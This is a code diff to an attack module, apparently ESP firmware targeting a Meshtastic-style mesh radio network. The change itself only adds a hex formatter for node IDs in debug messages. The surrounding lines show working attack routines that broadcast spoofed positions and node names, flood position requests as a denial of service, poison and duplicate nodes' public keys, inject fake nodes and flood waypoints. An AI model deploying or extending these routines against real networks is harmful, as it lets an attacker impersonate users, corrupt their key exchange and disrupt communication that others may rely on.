@@ -1,8 +1,24 @@
 #include "TMAttack.hpp"
 #include "esp_log.h"
 #include <iterator>
+#include <iomanip>
+#include <sstream>
 
 extern void sendDebugMessage(const std::string& message);
+
+static std::string toHexNodeId(uint32_t nodeId) {
+    static constexpr char kHex[] = "0123456789abcdef";
+    char buf[8] = {0};
+    int pos = 8;
+    if (nodeId == 0) {
+        return "0";
+    }
+    while (nodeId != 0 && pos > 0) {
+        buf[--pos] = kHex[nodeId & 0xF];
+        nodeId >>= 4;
+    }
+    return std::string(&buf[pos], 8 - pos);
+}
 
 uint32_t TMAttack::getRandomTarget() {
     auto ret = mtCompact->nodeinfo_db.getRandomNode();
@@ -37,7 +53,7 @@ void TMAttack::atkRndPos() {
             return;  // no valid target found
         }
     }
-    sendDebugMessage("Sending fake position for node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
+    sendDebugMessage("Sending fake position for node 0x" + toHexNodeId(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
     mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
     mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
 }
@@ -76,13 +92,13 @@ void TMAttack::atkNameChange() {
     node->long_name[39] = '\0';
     mtCompact->sendNodeInfo(*node, 0xffffffff, false);
     mtCompact->sendNodeInfo(*node, 0xffffffff, false);
-    sendDebugMessage("Changed longname of node 0x" + std::to_string(srcnode) + " to \"" + node->long_name + "\"");
+    sendDebugMessage("Changed longname of node 0x" + toHexNodeId(srcnode) + " to \"" + node->long_name + "\"");
 }
 
 void TMAttack::atkDdos() {
     uint32_t srcnode = esp_random();
     mtCompact->sendRequestPositionInfo(0xffffffff, 256, srcnode);
-    sendDebugMessage("Sent DDOS msg 1 request from 0x" + std::to_string(srcnode));
+    sendDebugMessage("Sent DDOS msg 1 request from 0x" + toHexNodeId(srcnode));
     srcnode = getRandomTarget();
     if (srcnode == 0) {
         sendDebugMessage("No valid target found for DDOS 2 attack.");
@@ -94,7 +110,7 @@ void TMAttack::atkDdos() {
         return;  // no valid target found
     }
     mtCompact->sendNodeInfo(*node, 0xffffffff, true);
-    sendDebugMessage("Sent DDOS msg 2 from 0x" + std::to_string(srcnode));
+    sendDebugMessage("Sent DDOS msg 2 from 0x" + toHexNodeId(srcnode));
 }
 
 void TMAttack::atkPkiPoison() {
@@ -116,7 +132,7 @@ void TMAttack::atkPkiPoison() {
     }
     mtCompact->sendNodeInfo(*node, 0xffffffff, false);
     mtCompact->sendNodeInfo(*node, 0xffffffff, false);
-    sendDebugMessage("Sent PKI poison for node 0x" + std::to_string(srcnode));
+    sendDebugMessage("Sent PKI poison for node 0x" + toHexNodeId(srcnode));
 }
 
 void TMAttack::atkPkiDupe() {
@@ -145,7 +161,7 @@ void TMAttack::atkPkiDupe() {
     nodeinfo.public_key_size = 32;
     mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
     mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
-    sendDebugMessage("Sent PKI dupe as node 0x" + std::to_string(srcnode));
+    sendDebugMessage("Sent PKI dupe as node 0x" + toHexNodeId(srcnode));
 }
 
 void TMAttack::atkRndNode() {
@@ -184,7 +200,7 @@ void TMAttack::atkRndNode() {
     mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 256, srcnode);
     mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
     mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 256, srcnode);
-    sendDebugMessage("Sent fake node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
+    sendDebugMessage("Sent fake node 0x" + toHexNodeId(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
 void TMAttack::atkWaypointFlood() {
@@ -206,7 +222,7 @@ void TMAttack::atkWaypointFlood() {
     uint32_t wpnum = esp_random();
     MtCompactHelpers::WaypointBuilder(waypoint, esp_random(), latitude, longitude, "WP-" + std::to_string(wpnum), "WP-" + std::to_string(wpnum), expire, icon);
     mtCompact->sendWaypointMessage(waypoint, 0xffffffff, 256, srcnode);
-    sendDebugMessage("Sent waypoint from node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
+    sendDebugMessage("Sent waypoint from node 0x" + toHexNodeId(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
 void TMAttack::loop() {
